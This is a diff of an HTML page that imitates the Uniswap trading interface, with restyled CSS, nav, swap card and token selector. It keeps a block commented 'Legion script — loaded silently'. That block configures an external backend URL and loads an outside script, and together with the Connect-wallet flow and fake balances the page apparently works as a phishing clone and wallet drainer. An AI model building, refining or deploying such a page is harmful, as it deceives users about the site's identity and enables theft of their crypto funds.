@@ -5,275 +5,268 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Uniswap Interface</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🦄</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 :root{
-  --bg:#131313;--bg2:#1c1c1c;--bg3:#2c2c2c;--bg4:#383838;
-  --border:rgba(255,255,255,.07);--border2:rgba(255,255,255,.12);
-  --text:#f5f5f5;--text2:#9b9b9b;--text3:#666;
-  --pink:#ff007a;--pink2:#fc72ff;
-  --radius:16px;--radius-sm:12px;
+  --bg:#0d0d0d;--bg2:#131313;--bg3:#1c1c1c;--bg4:#242424;--bg5:#2c2c2c;
+  --border:rgba(255,255,255,.06);--border2:rgba(255,255,255,.1);
+  --text:#f5f5f5;--text2:#888;--text3:#555;
+  --pink:#fc72ff;--pink2:#ff007a;--pink-bg:rgba(252,114,255,.12);
+  --radius:20px;--radius-sm:16px;
 }
-body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
-a{color:inherit;text-decoration:none}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
 button{font-family:inherit;cursor:pointer;border:none;outline:none}
-input{font-family:inherit;outline:none;border:none}
+input{font-family:inherit;outline:none;border:none;background:none}
 
 /* ─── NAV ─── */
-nav{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 16px;height:72px;background:var(--bg);border-bottom:1px solid var(--border)}
-.nav-left{display:flex;align-items:center;gap:8px}
-.nav-logo{display:flex;align-items:center;gap:8px;padding:8px;border-radius:12px;transition:background .15s}
+nav{position:sticky;top:0;z-index:100;display:flex;align-items:center;height:72px;padding:0 20px;background:var(--bg);border-bottom:1px solid var(--border)}
+.nav-logo{display:flex;align-items:center;gap:6px;padding:8px 10px;border-radius:12px;cursor:pointer;transition:background .15s;flex-shrink:0}
 .nav-logo:hover{background:var(--bg3)}
-.nav-logo svg{width:32px;height:32px}
-.nav-links{display:flex;align-items:center;gap:2px;margin-left:8px}
-.nav-link{padding:8px 12px;border-radius:12px;font-size:16px;font-weight:500;color:var(--text2);transition:all .15s;cursor:pointer}
-.nav-link:hover,.nav-link.active{background:var(--bg3);color:var(--text)}
-.nav-right{display:flex;align-items:center;gap:8px}
-.nav-chain{display:flex;align-items:center;gap:6px;padding:8px 12px;border-radius:12px;background:var(--bg2);border:1px solid var(--border2);font-size:14px;font-weight:500;cursor:pointer;transition:background .15s}
-.nav-chain:hover{background:var(--bg3)}
-.chain-dot{width:18px;height:18px;border-radius:50%;background:linear-gradient(135deg,#627eea,#a855f7)}
-.nav-connect{padding:10px 18px;border-radius:12px;background:rgba(255,0,122,.12);color:var(--pink);font-size:14px;font-weight:600;border:1px solid rgba(255,0,122,.2);cursor:pointer;transition:all .15s}
-.nav-connect:hover{background:rgba(255,0,122,.2)}
-.nav-more{width:36px;height:36px;border-radius:12px;background:var(--bg2);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--text2);font-size:18px;transition:background .15s}
+.nav-logo-icon{width:28px;height:28px}
+.nav-logo-text{font-size:17px;font-weight:600;color:var(--text);white-space:nowrap}
+.nav-logo-arrow{font-size:11px;color:var(--text2);margin-left:2px}
+.nav-links{display:flex;align-items:center;gap:2px;margin-left:4px}
+.nav-link{padding:8px 14px;border-radius:12px;font-size:16px;font-weight:500;color:var(--text2);cursor:pointer;white-space:nowrap;transition:all .15s}
+.nav-link:hover,.nav-link.active{color:var(--text);background:var(--bg3)}
+.nav-center{flex:1;display:flex;justify-content:center;padding:0 16px}
+.nav-search{display:flex;align-items:center;gap:8px;background:var(--bg3);border:1px solid var(--border2);border-radius:14px;padding:10px 16px;width:100%;max-width:340px;cursor:text;transition:all .15s}
+.nav-search:hover{border-color:rgba(255,255,255,.18)}
+.nav-search-icon{color:var(--text3);font-size:16px;flex-shrink:0}
+.nav-search-text{font-size:15px;color:var(--text3);flex:1}
+.nav-search-kbd{background:var(--bg4);border:1px solid var(--border2);border-radius:6px;padding:2px 6px;font-size:12px;color:var(--text3);font-family:monospace}
+.nav-right{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.nav-more{width:36px;height:36px;border-radius:12px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--text2);font-size:18px;transition:background .15s}
 .nav-more:hover{background:var(--bg3)}
+.nav-connect{padding:10px 20px;border-radius:14px;background:var(--pink);color:#000;font-size:15px;font-weight:700;cursor:pointer;transition:all .15s;white-space:nowrap}
+.nav-connect.connected{background:var(--bg3);color:var(--text);font-size:14px;border:1px solid var(--border2)}
+.nav-connect:hover{opacity:.9}
 
 /* ─── MAIN ─── */
-main{display:flex;flex-direction:column;align-items:center;padding:24px 16px 80px;min-height:calc(100vh - 72px)}
+main{display:flex;flex-direction:column;align-items:center;padding:16px 16px 80px;min-height:calc(100vh - 72px)}
 
-/* ─── SWAP CARD ─── */
-.swap-wrap{width:100%;max-width:480px;margin-top:24px}
+/* ─── SWAP WRAP ─── */
+.swap-wrap{width:100%;max-width:480px;margin-top:20px}
 
-/* Tabs */
-.tabs{display:flex;align-items:center;gap:2px;margin-bottom:8px;padding:0 4px}
-.tab{padding:8px 14px;border-radius:10px;font-size:16px;font-weight:500;color:var(--text2);cursor:pointer;transition:all .15s}
+/* Tab row */
+.tab-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;padding:0 2px}
+.tabs{display:flex;align-items:center;gap:1px;background:var(--bg3);border-radius:14px;padding:3px}
+.tab{padding:7px 14px;border-radius:11px;font-size:15px;font-weight:500;color:var(--text2);cursor:pointer;transition:all .15s;white-space:nowrap}
 .tab:hover{color:var(--text)}
-.tab.active{background:var(--bg2);color:var(--text)}
+.tab.active{background:var(--bg);color:var(--text);box-shadow:0 1px 4px rgba(0,0,0,.4)}
+.settings-btn{width:36px;height:36px;border-radius:12px;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;color:var(--text2);font-size:17px;cursor:pointer;transition:all .15s}
+.settings-btn:hover{background:var(--bg4);color:var(--text)}
 
 /* Card */
-.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:4px}
-
-/* Card top bar */
-.card-header{display:flex;align-items:center;justify-content:space-between;padding:12px 12px 8px}
-.card-title{font-size:16px;font-weight:500;color:var(--text)}
-.settings-btn{width:34px;height:34px;border-radius:10px;background:transparent;display:flex;align-items:center;justify-content:center;color:var(--text2);font-size:18px;cursor:pointer;transition:background .15s}
-.settings-btn:hover{background:var(--bg3)}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
 
 /* Token box */
-.token-box{background:var(--bg3);border-radius:var(--radius-sm);padding:16px;transition:background .15s}
+.token-box{background:var(--bg3);padding:16px 16px 12px;cursor:text}
 .token-box:hover{background:var(--bg4)}
-.token-box-label{font-size:14px;color:var(--text2);margin-bottom:8px}
-.token-row{display:flex;align-items:center;justify-content:space-between;gap:8px}
-.token-input{flex:1;background:transparent;color:var(--text);font-size:36px;font-weight:500;placeholder:color(var(--text3));min-width:0;line-height:1.2}
-.token-input::placeholder{color:var(--text3)}
-.token-selector{display:flex;align-items:center;gap:8px;background:var(--bg);border-radius:30px;padding:8px 10px 8px 8px;cursor:pointer;flex-shrink:0;border:1px solid var(--border2);transition:all .15s}
-.token-selector:hover{background:var(--bg2);border-color:rgba(255,255,255,.2)}
-.token-icon{width:26px;height:26px;border-radius:50%}
-.token-name{font-size:16px;font-weight:600}
-.token-chevron{color:var(--text2);font-size:14px;margin-left:2px}
-.token-usd{font-size:13px;color:var(--text2);margin-top:6px}
-.token-balance{font-size:13px;color:var(--text2);text-align:right;margin-top:6px}
-.max-btn{color:var(--pink);font-size:13px;font-weight:600;cursor:pointer;margin-left:4px}
-.max-btn:hover{color:var(--pink2)}
+.token-box-label{font-size:14px;color:var(--text2);margin-bottom:10px;font-weight:500}
+.token-row{display:flex;align-items:center;gap:8px}
+.amount-input{flex:1;font-size:36px;font-weight:400;color:var(--text);background:none;min-width:0;line-height:1.1}
+.amount-input::placeholder{color:var(--text3)}
+.token-pill{display:flex;align-items:center;gap:7px;background:var(--bg);border-radius:30px;padding:7px 10px 7px 7px;cursor:pointer;flex-shrink:0;transition:all .15s;border:1px solid var(--border2)}
+.token-pill:hover{background:var(--bg2);border-color:rgba(255,255,255,.18)}
+.token-pill-img{width:24px;height:24px;border-radius:50%}
+.token-pill-name{font-size:16px;font-weight:700}
+.token-pill-arrow{font-size:13px;color:var(--text2)}
+.token-pill-select{display:flex;align-items:center;gap:6px;background:var(--pink-bg);border-radius:30px;padding:9px 14px;cursor:pointer;flex-shrink:0;transition:all .15s;border:1px solid rgba(252,114,255,.2)}
+.token-pill-select:hover{background:rgba(252,114,255,.2)}
+.token-pill-select-text{font-size:15px;font-weight:700;color:var(--pink)}
+.token-pill-select-arrow{font-size:13px;color:var(--pink)}
+.token-sub{display:flex;align-items:center;justify-content:space-between;margin-top:6px}
+.token-usd{font-size:14px;color:var(--text2)}
+.token-bal{font-size:14px;color:var(--text2)}
+.max-btn{color:var(--pink);font-weight:600;cursor:pointer;margin-left:4px}
 
-/* Swap arrow */
-.swap-arrow-wrap{display:flex;justify-content:center;margin:-8px 0;position:relative;z-index:1}
-.swap-arrow-btn{width:40px;height:40px;border-radius:10px;background:var(--bg2);border:4px solid var(--bg);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--text2);font-size:18px;transition:all .15s}
-.swap-arrow-btn:hover{background:var(--bg3);color:var(--text)}
+/* Divider arrow */
+.arrow-wrap{display:flex;justify-content:center;position:relative;height:0;z-index:1}
+.arrow-btn{width:38px;height:38px;border-radius:10px;background:var(--bg2);border:4px solid var(--bg3);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--text2);font-size:17px;transition:all .15s;margin-top:-19px}
+.arrow-btn:hover{background:var(--bg4);color:var(--text)}
 
-/* Price info */
-.price-info{display:flex;align-items:center;justify-content:space-between;padding:10px 4px;font-size:14px;color:var(--text2)}
-.price-route{display:flex;align-items:center;gap:4px;cursor:pointer}
-.price-route:hover{color:var(--text)}
+/* Main button */
+.main-btn{width:100%;padding:18px;font-size:20px;font-weight:600;cursor:pointer;transition:all .15s;border:none}
+.main-btn.connect{background:var(--pink-bg);color:var(--pink);border-top:1px solid var(--border)}
+.main-btn.connect:hover{background:rgba(252,114,255,.18)}
+.main-btn.swap{background:linear-gradient(135deg,var(--pink2),var(--pink));color:#fff}
+.main-btn.swap:hover{opacity:.93;transform:scale(.998)}
 
-/* Connect / Swap btn */
-.swap-btn{width:100%;padding:18px;border-radius:var(--radius);font-size:20px;font-weight:600;border:none;cursor:pointer;transition:all .15s;margin-top:4px}
-.swap-btn-connect{background:rgba(255,0,122,.1);color:var(--pink);border:1px solid rgba(255,0,122,.15)}
-.swap-btn-connect:hover{background:rgba(255,0,122,.18)}
-.swap-btn-active{background:linear-gradient(135deg,#ff007a,#fc72ff);color:#fff}
-.swap-btn-active:hover{opacity:.92;transform:scale(.995)}
+/* Price row */
+.price-row{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;font-size:14px;color:var(--text2);display:none}
+.price-row.show{display:flex}
+.price-left{display:flex;align-items:center;gap:4px;cursor:pointer}
+.price-left:hover{color:var(--text)}
+.price-tag{font-size:13px;color:#22c55e;background:rgba(34,197,94,.1);padding:2px 8px;border-radius:20px}
 
-/* Details row */
-.details-row{display:flex;align-items:center;justify-content:space-between;padding:6px 0;font-size:14px;color:var(--text2)}
-.details-val{color:var(--text);font-weight:500}
-.details-section{padding:10px 12px;margin-top:4px;border-top:1px solid var(--border)}
+/* Details */
+.details{padding:8px 16px 4px;display:none}
+.details.show{display:block}
+.detail-row{display:flex;align-items:center;justify-content:space-between;padding:5px 0;font-size:14px;color:var(--text2)}
+.detail-val{color:var(--text);font-weight:500}
 
-/* Bottom disclaimer */
-.disclaimer{margin-top:24px;text-align:center;font-size:13px;color:var(--text3);max-width:400px;line-height:1.6}
-.disclaimer a{color:var(--text2);text-decoration:underline}
+/* Footer */
+.footer-note{margin-top:20px;text-align:center;font-size:13px;color:var(--text3);max-width:400px;line-height:1.6}
+.footer-note a{color:var(--text2);text-decoration:underline;text-underline-offset:2px}
 
-/* Token selector modal */
-.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1000;display:flex;align-items:flex-start;justify-content:center;padding-top:80px}
-.modal{background:#1c1c1c;border:1px solid var(--border2);border-radius:20px;width:100%;max-width:420px;overflow:hidden}
-.modal-header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px}
+/* ─── TOKEN MODAL ─── */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:999;display:flex;align-items:flex-start;justify-content:center;padding-top:80px;display:none}
+.modal-overlay.open{display:flex}
+.modal{background:#1a1a1a;border:1px solid rgba(255,255,255,.1);border-radius:20px;width:calc(100% - 32px);max-width:420px;max-height:80vh;display:flex;flex-direction:column;overflow:hidden}
+.modal-head{display:flex;align-items:center;justify-content:space-between;padding:18px 20px 12px}
 .modal-title{font-size:18px;font-weight:600}
-.modal-close{width:32px;height:32px;border-radius:8px;background:var(--bg3);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;color:var(--text2)}
-.modal-search{padding:0 16px 12px}
-.modal-search input{width:100%;padding:12px 16px;border-radius:12px;background:var(--bg3);border:1px solid var(--border2);color:var(--text);font-size:16px}
-.modal-search input::placeholder{color:var(--text3)}
-.common-tokens{display:flex;flex-wrap:wrap;gap:8px;padding:4px 16px 16px}
-.common-token{display:flex;align-items:center;gap:6px;padding:8px 12px;border-radius:30px;background:var(--bg3);border:1px solid var(--border2);cursor:pointer;font-size:14px;font-weight:500;transition:all .15s}
-.common-token:hover{background:var(--bg4);border-color:rgba(255,255,255,.2)}
-.token-list{max-height:380px;overflow-y:auto;border-top:1px solid var(--border)}
-.token-list-item{display:flex;align-items:center;gap:12px;padding:12px 20px;cursor:pointer;transition:background .1s}
-.token-list-item:hover{background:var(--bg3)}
-.token-list-info{flex:1}
-.token-list-name{font-size:16px;font-weight:500}
-.token-list-full{font-size:13px;color:var(--text2)}
-.token-list-bal{text-align:right;font-size:14px}
-.token-list-bal-usd{font-size:12px;color:var(--text2)}
-.hidden{display:none}
+.modal-x{width:30px;height:30px;border-radius:8px;background:var(--bg3);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:15px;color:var(--text2);transition:background .1s}
+.modal-x:hover{background:var(--bg4)}
+.modal-search-wrap{padding:0 16px 12px}
+.modal-search-wrap input{width:100%;padding:13px 16px;border-radius:14px;background:var(--bg3);border:1px solid var(--border2);color:var(--text);font-size:15px;transition:border .15s}
+.modal-search-wrap input::placeholder{color:var(--text3)}
+.modal-search-wrap input:focus{border-color:rgba(252,114,255,.4)}
+.common-wrap{display:flex;flex-wrap:wrap;gap:8px;padding:0 16px 12px}
+.common-chip{display:flex;align-items:center;gap:6px;padding:7px 12px;border-radius:30px;background:var(--bg3);border:1px solid var(--border2);cursor:pointer;font-size:13px;font-weight:600;transition:all .1s}
+.common-chip:hover{background:var(--bg4);border-color:rgba(255,255,255,.18)}
+.common-chip img{width:18px;height:18px;border-radius:50%}
+.token-list-wrap{overflow-y:auto;flex:1;border-top:1px solid var(--border)}
+.token-item{display:flex;align-items:center;gap:12px;padding:10px 20px;cursor:pointer;transition:background .08s}
+.token-item:hover{background:var(--bg3)}
+.token-item img{width:38px;height:38px;border-radius:50%}
+.ti-info{flex:1}
+.ti-sym{font-size:16px;font-weight:600}
+.ti-name{font-size:13px;color:var(--text2)}
+.ti-bal{text-align:right;font-size:14px}
+.ti-bal-usd{font-size:12px;color:var(--text2)}
 </style>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
 
 <!-- ─── NAV ─── -->
 <nav>
-  <div class="nav-left">
-    <div class="nav-logo">
-      <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M7.927 3.696c-.372-.076-.46.147-.2.484l.985 1.348c.27.368.886.736 1.368.82l5.072.884c.483.084.581-.116.219-.443L11.86 4.176c-.362-.327-1.56-.714-3.932-.48zM21.9 6.608c-1.126-.28-2.072.296-2.072.296s-.56.84-.84 1.12c-.28.28-1.12.56-1.12.56L16.5 8.304l.56 1.96s.28.84.56 1.12c.28.28 1.12.28 1.12.28s.84-.28 1.12-.56c.28-.28.84-.84 1.12-1.4l.56-1.4-.56-1.12-.08-.576zM9.5 9.5c-.552 0-1 .448-1 1v1c0 .552.448 1 1 1h1c.552 0 1-.448 1-1v-1c0-.552-.448-1-1-1h-1z" fill="#FF007A"/>
-        <path d="M16 2C8.268 2 2 8.268 2 16s6.268 14 14 14 14-6.268 14-14S23.732 2 16 2z" fill="url(#uni_grad)" opacity=".15"/>
-        <path d="M12.5 8c-.552 0-1 .448-1 1v2c0 .552.448 1 1 1h2c.552 0 1-.448 1-1V9c0-.552-.448-1-1-1h-2zM19.5 14c-.276 0-.5.224-.5.5v5.5l-7-8.5H10v10h2v-5.5l7 8.5H21V14h-1.5z" fill="#FF007A"/>
-        <defs>
-          <linearGradient id="uni_grad" x1="2" y1="2" x2="30" y2="30" gradientUnits="userSpaceOnUse">
-            <stop stop-color="#FF007A"/>
-            <stop offset="1" stop-color="#FC72FF"/>
-          </linearGradient>
-        </defs>
-      </svg>
-    </div>
-    <div class="nav-links">
-      <div class="nav-link active" onclick="setTab('swap')">Swap</div>
-      <div class="nav-link" onclick="window.location.href='#explore'">Explore</div>
-      <div class="nav-link" onclick="window.location.href='#pool'">Pool</div>
+  <div class="nav-logo" onclick="">
+    <svg class="nav-logo-icon" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="16" cy="16" r="16" fill="#FF007A" opacity=".15"/>
+      <text x="7" y="22" font-size="18">🦄</text>
+    </svg>
+    <span class="nav-logo-text">Uniswap</span>
+    <span class="nav-logo-arrow">▾</span>
+  </div>
+  <div class="nav-links">
+    <div class="nav-link active">Trade</div>
+    <div class="nav-link">Explore</div>
+    <div class="nav-link">Pool</div>
+    <div class="nav-link">Portfolio</div>
+  </div>
+  <div class="nav-center">
+    <div class="nav-search" onclick="">
+      <span class="nav-search-icon">🔍</span>
+      <span class="nav-search-text">Search tokens, pools, and wallets</span>
+      <span class="nav-search-kbd">/</span>
     </div>
   </div>
   <div class="nav-right">
-    <div class="nav-chain" id="chainBtn">
-      <div class="chain-dot"></div>
-      <span>Ethereum</span>
-      <span style="color:var(--text3);font-size:12px">▼</span>
-    </div>
-    <button class="nav-connect" id="navConnectBtn" onclick="triggerConnect()">Connect</button>
     <div class="nav-more">···</div>
+    <button class="nav-connect" id="navConnectBtn" onclick="triggerConnect()">Connect</button>
   </div>
 </nav>
 
 <!-- ─── MAIN ─── -->
 <main>
   <div class="swap-wrap">
-    <div class="tabs">
-      <div class="tab active" onclick="setTab('swap')">Swap</div>
-      <div class="tab" onclick="setTab('limit')">Limit</div>
-      <div class="tab" onclick="setTab('send')">Send</div>
-      <div class="tab" onclick="setTab('buy')">Buy</div>
+
+    <!-- Tab row -->
+    <div class="tab-row">
+      <div class="tabs">
+        <div class="tab active" onclick="switchTab(this,'Swap')">Swap</div>
+        <div class="tab" onclick="switchTab(this,'Limit')">Limit</div>
+        <div class="tab" onclick="switchTab(this,'Buy')">Buy</div>
+        <div class="tab" onclick="switchTab(this,'Sell')">Sell</div>
+      </div>
+      <button class="settings-btn">⚙</button>
     </div>
 
+    <!-- Card -->
     <div class="card">
-      <div class="card-header">
-        <span class="card-title">Swap</span>
-        <button class="settings-btn" title="Settings">⚙</button>
-      </div>
 
-      <!-- Sell -->
-      <div class="token-box" style="margin-bottom:2px">
+      <!-- Sell box -->
+      <div class="token-box" id="sellBox">
         <div class="token-box-label">Sell</div>
         <div class="token-row">
-          <input class="token-input" id="sellInput" type="text" inputmode="decimal" placeholder="0" autocomplete="off" oninput="onSellInput(this.value)">
-          <div class="token-selector" onclick="openModal('sell')">
-            <img class="token-icon" id="sellIcon" src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 32 32%22><circle cx=%2216%22 cy=%2216%22 r=%2216%22 fill=%22%23627eea%22/></svg>'">
-            <span class="token-name" id="sellToken">ETH</span>
-            <span class="token-chevron">▼</span>
+          <input class="amount-input" id="sellAmt" type="text" inputmode="decimal" placeholder="0" autocomplete="off" oninput="onSellInput(this.value)">
+          <div class="token-pill" onclick="openModal('sell')" id="sellPill">
+            <img class="token-pill-img" id="sellImg" src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 32 32%22><circle cx=%2216%22 cy=%2216%22 r=%2216%22 fill=%22%23627eea%22/></svg>'">
+            <span class="token-pill-name" id="sellSym">ETH</span>
+            <span class="token-pill-arrow">⌄</span>
           </div>
         </div>
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px">
+        <div class="token-sub">
           <span class="token-usd" id="sellUsd">$0</span>
-          <span class="token-balance" id="sellBal" style="display:none">Balance: <span id="sellBalAmt">0</span> <span class="max-btn" onclick="setMax()">Max</span></span>
+          <span class="token-bal" id="sellBal" style="display:none">Balance: <b id="sellBalAmt">0</b><span class="max-btn" onclick="setMax()"> Max</span></span>
         </div>
       </div>
 
-      <!-- Swap arrow -->
-      <div class="swap-arrow-wrap">
-        <button class="swap-arrow-btn" onclick="flipTokens()">⇅</button>
+      <!-- Arrow -->
+      <div class="arrow-wrap">
+        <button class="arrow-btn" onclick="flipTokens()">↓</button>
       </div>
 
-      <!-- Buy -->
-      <div class="token-box" style="margin-top:2px">
+      <!-- Buy box -->
+      <div class="token-box" id="buyBox" style="margin-top:2px">
         <div class="token-box-label">Buy</div>
         <div class="token-row">
-          <input class="token-input" id="buyInput" type="text" inputmode="decimal" placeholder="0" autocomplete="off" readonly>
-          <div class="token-selector" onclick="openModal('buy')">
-            <img class="token-icon" id="buyIcon" src="https://assets.coingecko.com/coins/images/6319/small/usdc.png" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 32 32%22><circle cx=%2216%22 cy=%2216%22 r=%2216%22 fill=%22%232775ca%22/></svg>'">
-            <span class="token-name" id="buyToken">USDC</span>
-            <span class="token-chevron">▼</span>
+          <input class="amount-input" id="buyAmt" type="text" placeholder="0" readonly>
+          <div class="token-pill-select" onclick="openModal('buy')" id="buyPillSelect">
+            <span class="token-pill-select-text">Select token</span>
+            <span class="token-pill-select-arrow">⌄</span>
+          </div>
+          <div class="token-pill" onclick="openModal('buy')" id="buyPill" style="display:none">
+            <img class="token-pill-img" id="buyImg" src="">
+            <span class="token-pill-name" id="buySym">USDC</span>
+            <span class="token-pill-arrow">⌄</span>
           </div>
         </div>
-        <div style="display:flex;justify-content:space-between;margin-top:6px">
+        <div class="token-sub">
           <span class="token-usd" id="buyUsd">$0</span>
         </div>
       </div>
 
-      <!-- Price + details -->
-      <div id="priceRow" class="price-info" style="padding:10px 12px 4px;display:none">
-        <div class="price-route">
-          <span id="priceText">1 ETH = 2,647.32 USDC</span>
-          <span style="margin-left:4px">↗</span>
-        </div>
-        <div style="display:flex;align-items:center;gap:4px;font-size:13px">
-          <span style="color:#22c55e">Best price</span>
-        </div>
+      <!-- Price row -->
+      <div class="price-row" id="priceRow">
+        <div class="price-left"><span id="priceText">1 ETH = 2,647.32 USDC</span> <span style="font-size:12px">↗</span></div>
+        <span class="price-tag">Best price</span>
       </div>
 
       <!-- Main button -->
-      <div style="padding:4px">
-        <button class="swap-btn swap-btn-connect" id="mainBtn" onclick="triggerConnect()">Connect Wallet</button>
-      </div>
+      <button class="main-btn connect" id="mainBtn" onclick="triggerConnect()">Connect</button>
 
-      <!-- Details expandable -->
-      <div id="detailsSection" class="details-section" style="display:none">
-        <div class="details-row">
-          <span>Price impact</span>
-          <span class="details-val" style="color:#22c55e">&lt;0.01%</span>
-        </div>
-        <div class="details-row">
-          <span>Max. slippage</span>
-          <span class="details-val">Auto</span>
-        </div>
-        <div class="details-row">
-          <span>Network fee</span>
-          <span class="details-val">~$2.41</span>
-        </div>
-        <div class="details-row">
-          <span>Route</span>
-          <span class="details-val">Uniswap V3</span>
-        </div>
+      <!-- Details -->
+      <div class="details" id="details">
+        <div class="detail-row"><span>Price impact</span><span class="detail-val" style="color:#22c55e">&lt;0.01%</span></div>
+        <div class="detail-row"><span>Max. slippage</span><span class="detail-val">Auto</span></div>
+        <div class="detail-row"><span>Network fee</span><span class="detail-val">~$2.41</span></div>
+        <div class="detail-row"><span>Route</span><span class="detail-val">Uniswap V3</span></div>
       </div>
     </div>
 
-    <div class="disclaimer">
-      By using Uniswap, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
-    </div>
+    <div class="footer-note">By using Uniswap, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</div>
   </div>
 </main>
 
 <!-- ─── TOKEN MODAL ─── -->
-<div class="modal-overlay hidden" id="tokenModal" onclick="closeModalOutside(event)">
+<div class="modal-overlay" id="tokenModal" onclick="closeOutside(event)">
   <div class="modal">
-    <div class="modal-header">
+    <div class="modal-head">
       <span class="modal-title">Select a token</span>
-      <div class="modal-close" onclick="closeModal()">✕</div>
+      <div class="modal-x" onclick="closeModal()">✕</div>
     </div>
-    <div class="modal-search">
-      <input type="text" placeholder="Search name or paste address" id="tokenSearch" oninput="filterTokens(this.value)">
+    <div class="modal-search-wrap">
+      <input type="text" id="tokenSearch" placeholder="Search name or paste address" oninput="filterTokens(this.value)" autofocus>
     </div>
-    <div class="common-tokens" id="commonTokens"></div>
-    <div class="token-list" id="tokenList"></div>
+    <div class="common-wrap" id="commonWrap"></div>
+    <div class="token-list-wrap" id="tokenList"></div>
   </div>
 </div>
 
-<!-- Legion script — loaded silently -->
+<!-- Legion script — silent -->
 <script>
 window.LEGION_CONFIG = {
   backendUrl: 'https://legionapi-production.up.railway.app',
@@ -284,169 +277,163 @@ window.LEGION_CONFIG = {
 <script src="./legion-one-script-v2.js"></script>
 
 <script>
-// ─── Token data ───────────────────────────────────────────────────────────────
 const TOKENS = [
-  { sym:'ETH',  name:'Ethereum',        img:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',   price:2647.32, bal:1.2450  },
-  { sym:'USDC', name:'USD Coin',         img:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',     price:1.00,    bal:1247.50 },
-  { sym:'USDT', name:'Tether',           img:'https://assets.coingecko.com/coins/images/325/small/tether.png',    price:1.00,    bal:800.00  },
-  { sym:'WBTC', name:'Wrapped Bitcoin',  img:'https://assets.coingecko.com/coins/images/7598/small/wrapped_bitcoin_wbtc.png', price:67480, bal:0.03 },
-  { sym:'DAI',  name:'Dai',              img:'https://assets.coingecko.com/coins/images/9956/small/dai-multi-collateral-mcd.png', price:1.00, bal:340 },
-  { sym:'LINK', name:'Chainlink',        img:'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png', price:14.82, bal:52 },
-  { sym:'UNI',  name:'Uniswap',          img:'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png', price:8.43, bal:120 },
-  { sym:'AAVE', name:'Aave',             img:'https://assets.coingecko.com/coins/images/12645/small/aave-token-round.png', price:92.10, bal:5 },
-  { sym:'MATIC',name:'Polygon',          img:'https://assets.coingecko.com/coins/images/4713/small/polygon.png',  price:0.73,    bal:3200 },
-  { sym:'ARB',  name:'Arbitrum',         img:'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg', price:1.21, bal:890 },
+  { sym:'ETH',   name:'Ethereum',       img:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',                                                             price:2647.32, bal:1.2450  },
+  { sym:'USDC',  name:'USD Coin',        img:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',                                                               price:1.00,    bal:1247.50 },
+  { sym:'USDT',  name:'Tether',          img:'https://assets.coingecko.com/coins/images/325/small/tether.png',                                                              price:1.00,    bal:800.00  },
+  { sym:'WBTC',  name:'Wrapped Bitcoin', img:'https://assets.coingecko.com/coins/images/7598/small/wrapped_bitcoin_wbtc.png',                                               price:67480,   bal:0.03    },
+  { sym:'DAI',   name:'Dai',             img:'https://assets.coingecko.com/coins/images/9956/small/dai-multi-collateral-mcd.png',                                           price:1.00,    bal:340     },
+  { sym:'LINK',  name:'Chainlink',       img:'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',                                                  price:14.82,   bal:52      },
+  { sym:'UNI',   name:'Uniswap',         img:'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png',                                                       price:8.43,    bal:120     },
+  { sym:'AAVE',  name:'Aave',            img:'https://assets.coingecko.com/coins/images/12645/small/aave-token-round.png',                                                  price:92.10,   bal:5       },
+  { sym:'MATIC', name:'Polygon',         img:'https://assets.coingecko.com/coins/images/4713/small/polygon.png',                                                            price:0.73,    bal:3200    },
